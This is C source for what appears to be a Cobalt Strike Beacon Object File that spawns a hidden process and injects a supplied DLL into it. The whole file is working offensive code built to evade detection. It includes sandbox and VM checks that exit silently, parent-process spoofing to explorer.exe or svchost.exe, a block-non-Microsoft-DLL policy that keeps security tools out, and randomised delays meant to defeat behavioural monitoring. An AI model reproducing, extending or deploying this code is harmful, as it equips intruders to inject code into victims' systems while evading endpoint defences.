#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* Windows API calls for anti-sandbox */
DECLSPEC_IMPORT WINBASEAPI VOID    WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI DWORD   WINAPI KERNEL32$GetTickCount (VOID);
DECLSPEC_IMPORT WINBASEAPI VOID    WINAPI KERNEL32$GetSystemInfo (LPSYSTEM_INFO lpSystemInfo);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$GlobalMemoryStatusEx (LPMEMORYSTATUSEX lpBuffer);

/* Extended Windows API for PPID Spoofing and BlockDll */
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
DECLSPEC_IMPORT WINBASEAPI VOID    WINAPI KERNEL32$DeleteProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap (VOID);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot (DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$Process32First (HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$Process32Next (HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);

/* Extended attributes for STARTUPINFOEX */
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif

#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ui64 << 44)
#endif

#ifndef PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON (0x00000001ui64 << 36)
#endif

#ifndef TH32CS_SNAPPROCESS
#define TH32CS_SNAPPROCESS 0x00000002
#endif

#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

#ifndef PROCESS_CREATE_PROCESS
#define PROCESS_CREATE_PROCESS 0x0080
#endif

/* Anti-sandbox detection - Detect VM/Sandbox environments */
BOOL detect_sandbox() {
   DWORD tick1, tick2;
   SYSTEM_INFO si;
   MEMORYSTATUSEX ms;
   
   /* Time acceleration detection */
   tick1 = KERNEL32$GetTickCount();
   KERNEL32$Sleep(100);
   tick2 = KERNEL32$GetTickCount();
   
   if ((tick2 - tick1) < 90) {
      return TRUE; /* Time anomaly detected, possible sandbox */
   }
   
   /* CPU core count detection */
   KERNEL32$GetSystemInfo(&si);
   if (si.dwNumberOfProcessors < 2) {
      return TRUE; /* Single core, possible VM */
   }
   
   /* Memory size detection */
   ms.dwLength = sizeof(MEMORYSTATUSEX);
   if (KERNEL32$GlobalMemoryStatusEx(&ms)) {
      if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) { /* < 2GB */
         return TRUE;
      }
   }
   
   return FALSE;
}
 
/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* Find legitimate parent process for PPID Spoofing - Prefer explorer.exe */
DWORD find_spoofed_ppid() {
   HANDLE hSnapshot;
   PROCESSENTRY32 pe32;
   DWORD targetPID = 0;
   
   /* Target process list - Sorted by priority */
   const char* targets[] = {
      "explorer.exe",      /* Best choice - User shell */
      "svchost.exe",       /* System service host */
      "RuntimeBroker.exe", /* Windows runtime broker */
      "dllhost.exe",       /* COM proxy */
      "sihost.exe"         /* Shell infrastructure host */
   };
   
   hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if (hSnapshot == INVALID_HANDLE_VALUE) {
      return 0;
   }
   
   pe32.dwSize = sizeof(PROCESSENTRY32);
   
   if (!KERNEL32$Process32First(hSnapshot, &pe32)) {
      KERNEL32$CloseHandle(hSnapshot);
      return 0;
   }
   
   /* Iterate through process list to find target process */
   do {
      for (int i = 0; i < 5; i++) {
         /* Simple case-insensitive string comparison */
         BOOL match = TRUE;
         const char* target = targets[i];
         char* procName = pe32.szExeFile;
         
         for (int j = 0; target[j] != '\0'; j++) {
            char c1 = target[j];
            char c2 = procName[j];
            
            /* Convert to lowercase for comparison */
            if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
            if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
            
            if (c1 != c2) {
               match = FALSE;
               break;
            }
         }
         
         if (match && procName[0] != '\0') {
            targetPID = pe32.th32ProcessID;
            KERNEL32$CloseHandle(hSnapshot);
            return targetPID; /* Found first matching process */
         }
      }
   } while (KERNEL32$Process32Next(hSnapshot, &pe32));
   
   KERNEL32$CloseHandle(hSnapshot);
   return targetPID;
}

/* Create process with PPID Spoofing and BlockDll using STARTUPINFOEX */
BOOL spawn_with_spoofing(BOOL x86, BOOL ignoreToken, STARTUPINFOA* si_base, PROCESS_INFORMATION* pi) {
   STARTUPINFOEXA si;
   SIZE_T attributeSize;
   LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
   HANDLE hParentProcess = NULL;
   DWORD spoofedPPID;
   BOOL result = FALSE;
   DWORD64 policy;
   
   /* Find legitimate parent process */
   spoofedPPID = find_spoofed_ppid();
   
   if (spoofedPPID == 0) {
      /* Silent fallback - No obvious output */
      return BeaconSpawnTemporaryProcess(x86, ignoreToken, si_base, pi);
   }
   
   /* Open parent process handle */
   hParentProcess = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofedPPID);
   if (!hParentProcess) {
      /* Silent fallback */
      return BeaconSpawnTemporaryProcess(x86, ignoreToken, si_base, pi);
   }
   
   /* Initialize STARTUPINFOEX */
   __stosb((void *)&si, 0, sizeof(STARTUPINFOEXA));
   si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
   si.StartupInfo.dwFlags = si_base->dwFlags;
   si.StartupInfo.wShowWindow = si_base->wShowWindow;
   
   /* Get required attribute list size */
   KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
   
   /* Allocate attribute list */
   lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(
      KERNEL32$GetProcessHeap(), 0, attributeSize
   );
   
   if (!lpAttributeList) {
      KERNEL32$CloseHandle(hParentProcess);
      return BeaconSpawnTemporaryProcess(x86, ignoreToken, si_base, pi);
   }
   
   /* Initialize attribute list */
   if (!KERNEL32$InitializeProcThreadAttributeList(lpAttributeList, 2, 0, &attributeSize)) {
      KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpAttributeList);
      KERNEL32$CloseHandle(hParentProcess);
      return BeaconSpawnTemporaryProcess(x86, ignoreToken, si_base, pi);
   }
   
   /* Attribute 1: PPID Spoofing - Silent setup */
   if (!KERNEL32$UpdateProcThreadAttribute(
      lpAttributeList,
      0,
      PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
      &hParentProcess,
      sizeof(HANDLE),
      NULL,
      NULL
   )) {
      /* Silent failure fallback */
      KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
      KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpAttributeList);
      KERNEL32$CloseHandle(hParentProcess);
      return BeaconSpawnTemporaryProcess(x86, ignoreToken, si_base, pi);
   }
   
   /* Attribute 2: Mitigation policy - ACG + BlockDll combination */
   policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON |
            PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
   
   KERNEL32$UpdateProcThreadAttribute(
      lpAttributeList,
      0,
      PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
      &policy,
      sizeof(DWORD64),
      NULL,
      NULL
   );
   /* ACG/BlockDll failure doesn't affect main flow, continue silently */
   
   si.lpAttributeList = lpAttributeList;
   
   /* Create process with extended startup info */
   result = BeaconSpawnTemporaryProcess(x86, ignoreToken, (STARTUPINFOA*)&si, pi);
   
   /* Cleanup */
   KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
   KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpAttributeList);
   KERNEL32$CloseHandle(hParentProcess);
   
   return result;
}
 
/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;
   DWORD               delay;

   /* Anti-sandbox check - Silent failure, leave no trace */
   if (detect_sandbox()) {
      return;
   }

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* Random delay to avoid batch behavior detection (pseudo-random based on DLL length) */
   delay = 60 + (dllLen % 140);
   KERNEL32$Sleep(delay);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Use enhanced process creation - Silent mode (no obvious output) */
   if (!spawn_with_spoofing(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }

   /* Micro-delay before injection to avoid burst behavior pattern */
   KERNEL32$Sleep(40 + (ignoreToken % 60));
   
   /* Early Bird APC injection - Inject during early process initialization */
   BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
   
   BeaconCleanupProcess(&pi);
}
 
void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}
 
void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}

